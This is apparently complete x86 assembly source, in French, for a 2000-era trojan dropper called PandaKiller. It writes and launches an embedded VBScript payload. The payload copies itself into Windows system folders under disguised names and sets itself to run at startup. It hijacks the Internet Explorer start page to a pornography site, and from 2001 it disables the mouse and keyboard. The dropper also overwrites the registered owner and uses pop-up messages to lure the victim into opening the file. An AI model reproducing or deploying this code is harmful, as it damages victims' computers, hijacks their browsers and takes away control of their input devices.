;Panda3.asm par PandaKiller                             03/10/00
;TASM32 /M /ML panda3
;TLINK32 -Tpe -x -aa panda3,,,import32

.386
locals
jumps
.model flat
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn MessageBoxA:PROC
extrn WinExec:PROC
extrn ExitProcess:PROC

.data
octets          dd   ?
flz_handle      dd   ?
nom_fichier     db   'C:\Salut.vbs',00h
prog            db   'C:\Salut.vbs',00h
TEXTE           db   'Salut ! Ca va ?',00h
TITRE           db   'Hello',00h
TEXTE2          db   'J''ai mis un fichier sur ton ordinateur',0dh,0ah
                db   'Il s''appelle Salut.vbs et se trouve dans C:\',0dh,0ah
                db   'Ouvre-le vite',00h
TITRE2          db   'FICHIER CREE',00h
CLE             db   '\Software\Microsoft\Windows\CurrentVersion',00h
DONNEE          db   'PandaKiller',00h
NOM             db   'RegisteredOwner',00h
p               dd   0
l               dd   0

DEBUTV:
db '''VBS/PandaKiller.Trojan.A PAR Pentasm99 (c)2000  03/10/00',0dh,0ah
db '''SE COPIE DANS WINDOWS ET WINDOWS\SYSTEM',0dh,0ah
db '',0dh,0ah
db 'DEBUT()',0dh,0ah
db 'Sub DEBUT()',0dh,0ah
db 'Set a = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'Set win = a.GetSpecialFolder(0)',0dh,0ah
db 'Set sys = a.GetSpecialFolder(1)',0dh,0ah
db 'Set c = a.GetFile(WScript.ScriptFullName)',0dh,0ah
db 'c.Copy(win&"\WSock32.dll.vbs")',0dh,0ah
db 'c.Copy(sys&"\PandaDwarf.txt.vbs")',0dh,0ah
db 'INTERNET()',0dh,0ah
db 'BUG2001()',0dh,0ah
db 'Set T = a.deletefile("C:\Salut.vbs")',0dh,0ah
db 'End Sub',0dh,0ah
db '',0dh,0ah
db '''MODIFIE LA PAGE INTERNET ET RAJOUTE UN RESISTRE DANS "RUN"',0dh,0ah
db 'Sub INTERNET()',0dh,0ah
db 'Dim W',0dh,0ah
db 'Set W = Wscript.CreateObject("WScript.Shell")',0dh,0ah
db 'W.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\'
db 'Start Page", "http://www.penthouse.com"',0dh,0ah
db 'W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
db 'StartWindoz", "C:\WINDOWS\SYSTEM\WSock32.dll.vbs"',0dh,0ah
db 'End Sub',0dh,0ah
db '',0dh,0ah
db '''DESACTIVE LA SOURIS ET LE CLAVIER EN 2001 ET EXECUTE WINMINE',0dh,0ah
db 'Sub BUG2001()',0dh,0ah
db 'If Year(Now) = 2001 Then',0dh,0ah
db '   Dim P',0dh,0ah
db '   Set P = Wscript.CreateObject("WScript.Shell")',0dh,0ah
db '   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
db 'Stop1", "rundll32,mouse disable"',0dh,0ah
db '   P.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\'
db 'Stop2", "rundll32,keyboard disable"',0dh,0ah
db '   P.run ("C:\WINDOWS\Winmine.exe")',0dh,0ah
db 'End If',0dh,0ah
db 'End Sub',0dh,0ah
taille  equ $-DEBUTV

.code
REGISTRE:       push offset l
                push offset p
                push 0
                push 1F0000h + 1 + 2h
                push 0
                push 0
                push 0
                push offset CLE
                push 80000002h                  ;HKEY_LOCAL_MACHINE
                call RegCreateKeyExA
                push 05h
                push offset DONNEE              ;PandaKiller
                push 01h
                push 0
                push offset NOM                 ;DANS RegisteredOwner
                push p
                call RegSetValueExA             ;CREE UN REGISTRE
                push 0
                call RegCloseKey                ;FERME LA BASE DE REGISTRE
FICHIER:        push 00h
                push 80h
                push 02h
                push 00h
                push 01h
                push 40000000h
                push offset nom_fichier         ;DONNE LE NOM DU FICHIER
                call CreateFileA
                mov  [flz_handle],eax
                push 00000000h
                push offset octets
                push offset taille
                push offset DEBUTV
                push [flz_handle]
                call WriteFile
                push [flz_handle]
                call CloseHandle
MESSAGE:        push 40h
                push offset TITRE
                push offset TEXTE
                push 0
                call MessageBoxA
                push 40h
                push offset TITRE2
                push offset TEXTE2
                push 0
                call MessageBoxA
                push 1
                push offset prog
                call WinExec
FIN:            push 0
                call ExitProcess
end REGISTRE

